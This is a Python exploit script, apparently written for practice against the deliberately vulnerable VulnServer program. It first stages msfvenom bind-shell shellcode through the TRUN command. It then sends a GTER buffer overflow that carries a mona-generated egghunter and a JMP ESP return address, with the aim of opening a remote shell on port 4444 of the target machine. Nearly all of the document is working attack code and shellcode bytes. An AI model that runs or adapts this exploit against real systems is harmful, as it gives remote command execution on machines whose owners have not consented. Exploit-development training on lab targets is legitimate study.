#! /bin/python3

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port

# Generated in with mona.py in Immunity Debugger: !mona egg -t w00t -wow64 -winver 10
EGGHUNTER =  b"\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53"
EGGHUNTER += b"\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c"
EGGHUNTER += b"\x05\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7"
EGGHUNTER += b"\xff\xe7"

# Old Egghunter, Does not work
#EGGHUNTER = b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
#EGGHUNTER += b"\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7"
#EGGHUNTER += b"\xaf\x75\xea\xaf\x75\xe7\xff\xe7"


# msfvenom -p windows/shell_bind_tcp RPORT=4444 EXITFUNC=thread -f python -v SHELL -b '\x00'
SHELL = b"w00tw00t"      # The egghunter will look for this, w00t repeated twice.
SHELL += b"\xb8\x9c\x02\xc9\x42\xda\xce\xd9\x74\x24\xf4\x5b"
SHELL += b"\x29\xc9\xb1\x53\x31\x43\x12\x03\x43\x12\x83\x5f"
SHELL += b"\x06\x2b\xb7\xa3\xef\x29\x38\x5b\xf0\x4d\xb0\xbe"
SHELL += b"\xc1\x4d\xa6\xcb\x72\x7e\xac\x99\x7e\xf5\xe0\x09"
SHELL += b"\xf4\x7b\x2d\x3e\xbd\x36\x0b\x71\x3e\x6a\x6f\x10"
SHELL += b"\xbc\x71\xbc\xf2\xfd\xb9\xb1\xf3\x3a\xa7\x38\xa1"
SHELL += b"\x93\xa3\xef\x55\x97\xfe\x33\xde\xeb\xef\x33\x03"
SHELL += b"\xbb\x0e\x15\x92\xb7\x48\xb5\x15\x1b\xe1\xfc\x0d"
SHELL += b"\x78\xcc\xb7\xa6\x4a\xba\x49\x6e\x83\x43\xe5\x4f"
SHELL += b"\x2b\xb6\xf7\x88\x8c\x29\x82\xe0\xee\xd4\x95\x37"
SHELL += b"\x8c\x02\x13\xa3\x36\xc0\x83\x0f\xc6\x05\x55\xc4"
SHELL += b"\xc4\xe2\x11\x82\xc8\xf5\xf6\xb9\xf5\x7e\xf9\x6d"
SHELL += b"\x7c\xc4\xde\xa9\x24\x9e\x7f\xe8\x80\x71\x7f\xea"
SHELL += b"\x6a\x2d\x25\x61\x86\x3a\x54\x28\xcf\x8f\x55\xd2"
SHELL += b"\x0f\x98\xee\xa1\x3d\x07\x45\x2d\x0e\xc0\x43\xaa"
SHELL += b"\x71\xfb\x34\x24\x8c\x04\x45\x6d\x4b\x50\x15\x05"
SHELL += b"\x7a\xd9\xfe\xd5\x83\x0c\x6a\xdd\x22\xff\x89\x20"
SHELL += b"\x94\xaf\x0d\x8a\x7d\xba\x81\xf5\x9e\xc5\x4b\x9e"
SHELL += b"\x37\x38\x74\xb1\x9b\xb5\x92\xdb\x33\x90\x0d\x73"
SHELL += b"\xf6\xc7\x85\xe4\x09\x22\xbe\x82\x42\x24\x79\xad"
SHELL += b"\x52\x62\x2d\x39\xd9\x61\xe9\x58\xde\xaf\x59\x0d"
SHELL += b"\x49\x25\x08\x7c\xeb\x3a\x01\x16\x88\xa9\xce\xe6"
SHELL += b"\xc7\xd1\x58\xb1\x80\x24\x91\x57\x3d\x1e\x0b\x45"
SHELL += b"\xbc\xc6\x74\xcd\x1b\x3b\x7a\xcc\xee\x07\x58\xde"
SHELL += b"\x36\x87\xe4\x8a\xe6\xde\xb2\x64\x41\x89\x74\xde"
SHELL += b"\x1b\x66\xdf\xb6\xda\x44\xe0\xc0\xe2\x80\x96\x2c"
SHELL += b"\x52\x7d\xef\x53\x5b\xe9\xe7\x2c\x81\x89\x08\xe7"
SHELL += b"\x01\xa9\xea\x2d\x7c\x42\xb3\xa4\x3d\x0f\x44\x13"
SHELL += b"\x01\x36\xc7\x91\xfa\xcd\xd7\xd0\xff\x8a\x5f\x09"
SHELL += b"\x72\x82\x35\x2d\x21\xa3\x1f"


PAYLOAD = (
    b'GTER /.:/' +
    b'\x90' * 10 +
    EGGHUNTER +
    b'\x90' * (135 - len(EGGHUNTER) - 10) + # We move the padding and make it NOP so our jump does not need to be precise.
    # jmp esp
    struct.pack('<L', 0x625026D3) +
    # JMP to the start of our buffer
    b'\xe9\x70\xff\xff\xff' +
    b'C' * (400 - 135 - 4 - 5)
)

PAYLOAD_SHELL = (
    b'TRUN ' +                        # TRUN command of the server
    SHELL                               # Shell code
    # b'\x90' * (1995 - (len(SHELL) + 5)) # padding 
    # 62501205   FFE4             JMP ESP
    # Return a bytes object.
    # Format string '<L': < means little-endian; L means unsigned long
    # b'\xe9\x30\xff\xff\xff' +      # Jump back into NOP sled so we create an infinite loop
    # struct.pack('<L', 0x62501023)+ # Override Return address, So we can execute on the stack
    # b'\xe9\x30\xff\xff\xff'        # Jump into NOP sled
)

with socket.create_connection((HOST, PORT)) as fd:
    print("Connected...")
    #print(fd.recv(1024)) # Get welcome message
    #print(fd.recv(1024)) # Get "You are user X" message
    print("Sending shellcode:")
    fd.sendall(PAYLOAD_SHELL)
    print("Shellcode has been staged")

with socket.create_connection((HOST, PORT)) as fd:
    print("Connected...")
    #print(fd.recv(1024)) # Get welcome message
    #print(fd.recv(1024)) # Get "You are user X" message
    print("Sending first stage:")
    fd.sendall(PAYLOAD)
    print('Done!\nCheck the port 4444 of the victim.\nThis may take a few minuets!')
